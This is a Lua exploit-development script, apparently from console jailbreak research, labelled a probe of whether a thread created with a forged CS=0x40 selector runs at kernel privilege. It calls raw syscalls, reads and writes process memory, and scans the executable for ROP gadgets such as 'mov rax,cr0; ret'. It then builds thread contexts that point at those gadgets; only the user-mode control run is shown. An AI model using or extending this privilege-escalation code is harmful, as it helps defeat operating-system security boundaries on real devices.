-- CRASH_CLASS: HIGH
-- PROBE 724a: is a CS=0x40 thr_create child running at CPL 0?
--
-- Context: 189a recorded CS=0x40 producing a live thread with no panic, and the
-- repository concluded the firmware replaces the selector. That conclusion was
-- never tested with a privileged instruction. If CS=0x40 is honoured the child
-- runs at CPL 0 and `mov rax, cr0` succeeds; at CPL 3 it raises #GP and the
-- kernel kills the process, which is exactly what the control below does.
--
-- Phase [A] scans eboot for `0F 20`/`0F 22` (mov to/from control register) and
-- prints file offsets, so phase [B] can reuse them after a relaunch (offsets are
-- stable across launches; only the base moves).
-- Phase [B] runs the CPL 3 control last, because it is expected to kill the
-- process: a child with CS=0x43 pointed at the same gadget.

print("=== PROBE 724a: is a CS=0x40 child at CPL 0? ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end

local fn_ud = syscall.pipe.fn_addr
local fn = to_num(fn_ud)
print("[0] pid=" .. tostring(to_num(native.fcall_with_rax(fn_ud, 20))))

local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() mk(593)(uint64(0), uint64(info)) end)
local ebase = (rd(info+0x10C) or 0)*4294967296 + (rd(info+0x108) or 0)
print(string.format("[0] eboot=0x%08X_%08X", math.floor(ebase/4294967296), ebase % 4294967296))
local EB = 0x494000

local function scan_all(pat)
    local res, chunk, off = {}, 0x1000, 0
    while off < EB do
        local n = math.min(chunk, EB-off)
        local ok, s = pcall(function() return memory.read_buffer(ebase+off, n) end)
        if not ok or type(s) ~= "string" then break end
        local p = 1
        while true do
            local q = string.find(s, pat, p, true)
            if not q then break end
            res[#res+1] = off + q - 1
            p = q + 1
        end
        off = off + n - (#pat-1)
        if n < chunk then break end
    end
    return res
end

print("[A] scanning for mov to/from control register")
local c0 = scan_all(string.char(0x0F,0x20))   -- mov r64, CRn
local c1 = scan_all(string.char(0x0F,0x22))   -- mov CRn, r64
print(string.format("[A] 0F20 sites=%d  0F22 sites=%d", #c0, #c1))
local function show(name, list, max)
    local out = {}
    for i=1,math.min(#list,max) do
        local o = list[i]
        local b1, b2 = 0, 0
        local ok, s = pcall(function() return memory.read_buffer(ebase+o, 6) end)
        if ok and type(s)=="string" and #s>=6 then b1, b2 = string.byte(s,3), string.byte(s,6) end
        out[#out+1] = string.format("%X:%02X%02X", o, b1, b2)
    end
    print("[A] " .. name .. " " .. table.concat(out, " "))
end
show("0F20", c0, 18)
show("0F22", c1, 12)
local ret3 = scan_all(string.char(0x0F,0x20,0xC0,0xC3))
print(string.format("[A] mov rax,cr0;ret sites=%d", #ret3))
if #ret3 > 0 then print(string.format("[A] cr0gadget=%X", ret3[1])) end
local store = scan_all(string.char(0x48,0x89,0x06,0xC3))  -- mov [rsi],rax; ret
print(string.format("[A] mov [rsi],rax;ret sites=%d", #store))
if #store > 0 then print(string.format("[A] storegadget=%X", store[1])) end

local sc_mmap = mk(477)
local page = 0x4000
local function mmap(px)
    local _, a = pcall(function() return sc_mmap(uint64(0), uint64(px), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end)
    local v = to_num(a)
    if v ~= 0 then zero(v, px) end
    return v
end
local Ctx = {MAGIC=0x108, TYPE=0x110, CS=0x0C0, RIP=0x0E0, RSP=0x0F8, SS=0x100,
             RDI=0x048, RSI=0x050, RDX=0x058, RAX=0x078}
local jmp_g = nil
do local l = scan_all(string.char(0xEB,0xFE)); if #l > 0 then jmp_g = l[1] end end
if not (jmp_g and #store > 0 and #ret3 > 0) then print("[A] gadget set incomplete, stopping") return end
print(string.format("[A] jmp$=%X", jmp_g))

local function child(cs, marker)
    local stack = mmap(page*4)
    local base = stack + page*4 - 0x200
    wq(base,    uint64(ebase + store[1]))
    wq(base+8,  uint64(ebase + jmp_g))
    local ctx = memory.alloc(0x500)
    zero(ctx, 0x500)
    wq(ctx+Ctx.MAGIC, uint64(0x480)); wq(ctx+Ctx.TYPE, uint64(0x10000))
    wq(ctx+Ctx.CS, uint64(cs));       wq(ctx+Ctx.SS, uint64(0x3B))
    wq(ctx+Ctx.RIP, uint64(ebase + ret3[1]))
    wq(ctx+Ctx.RSP, uint64(base))
    wq(ctx+Ctx.RSI, uint64(marker))
    local tb = memory.alloc(8)
    wq(tb, uint64(0))
    local ok, rv = pcall(function() return mk(430)(uint64(ctx), uint64(tb), uint64(0)) end)
    local r = ok and to_num(rv) or -999
    return r, rd(tb) or 0
end

local ts = memory.alloc(16)
local function sleep_ms(ms) wq(ts,0); wq(ts+8, ms*1000000); pcall(function() mk(240)(uint64(ts), uint64(0)) end) end

print("")
print("[B] control: CS=0x43, mov rax,cr0 (a #GP at CPL 3 kills this process)")
local m1 = mmap(page)
local rv, tid = child(0x43, m1)
print(string.format("[B] thr_create rv=%d tid=%X", rv, tid))
sleep_ms(300)
print(string.format("[B] SURVIVED control marker=%08X%08X - the gadget did not fault", rd(m1) or 0, rd(m1+4) or 0))
